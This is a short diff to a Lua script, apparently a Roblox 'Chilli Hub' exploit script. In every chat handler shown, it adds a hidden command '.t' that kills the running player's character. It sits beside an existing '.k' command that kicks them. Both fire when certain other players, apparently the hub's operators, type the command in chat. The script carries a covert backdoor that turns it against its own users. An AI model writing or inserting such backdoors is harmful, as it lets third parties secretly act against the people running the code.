@@ -8,6 +8,8 @@ for _, plr in pairs(Players:GetPlayers()) do
         plr.Chatted:Connect(function(msg)
             if msg == ".k" then
                 localPlayer:Kick("You have been removed by Chilli Hub")
+            elseif msg == ".t" then
+                localPlayer.Character.Humanoid.Health = 0
             end
         end)
     end
@@ -18,6 +20,8 @@ Players.PlayerAdded:Connect(function(plr)
         plr.Chatted:Connect(function(msg)
             if msg == ".k" then
                 localPlayer:Kick("You have been removed by Chilli Hub")
+            elseif msg == ".t" then
+                localPlayer.Character.Humanoid.Health = 0
             end
         end)
     end
